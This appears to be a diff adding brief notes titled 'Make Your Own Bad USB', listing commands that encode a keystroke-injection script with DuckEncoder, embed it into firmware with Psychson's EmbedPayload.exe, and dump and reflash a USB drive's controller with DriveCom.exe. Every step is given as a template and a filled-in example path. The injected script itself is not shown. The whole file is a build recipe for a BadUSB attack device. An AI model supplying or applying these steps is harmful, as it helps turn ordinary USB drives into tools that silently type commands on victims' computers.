@@ -1,0 +1,12 @@
+Make Your Own Bad USB
+
+E:\Documents\Bad_USB\DuckEncoder\script.txt
+java -jar "PATH to \duckencode.jar" -i "PATH to \script.txt"-o "\payload.bin Path"
+java -jar E:\Documents\BadUSB\DuckEncoder\duckencode.jar -i E:\Documents\Bad_USB\DuckEncoder\script.txt -o E:\Documents\Bad_USB\DuckEncoder\inject.bin
+"Path to EmbedPayload.exe" "PATH to payload" "PATH to the firmware we built"
+E:\Documents\BadUSB\Psychson\tools\EmbedPayload.exe E:\Documents\Bad_USB\DuckEncoder\inject.bin E:\Documents\Bad_USB\Psychson\firmware\bin\fw.bin
+"PATH to DriveCom.exe" /drive="Drive Letter of our USB" /action=DumpFirmware /burner="PATH to our burner image" /firmware="PATH of the output.bin"
+E:\Documents\Bad_USB\Psychson-master\tools\DriveCom.exe /drive=F /action=DumpFirmware /burner=E:\Documents\Bad_USB\Firmware\BN03V117M.BIN /firmware=E:\Documents\Bad_USB\originalfw.bin
+Flashing Firmware
+"PATH to DriveCom.exe" /drive="Drive Letter" /action=SendFirmware /burner="PATH to our burner image" /firmware="PATH to the firmware"
+E:\Documents\BadUSB\Psychson\tools\DriveCom.exe /drive=F /action=SendFirmware /burner=E:\Documents\Bad_USB\Firmware\BN03V117M.BIN /firmware=E:\Documents\Bad_USB\Psychson\firmware\bin\fw.bin
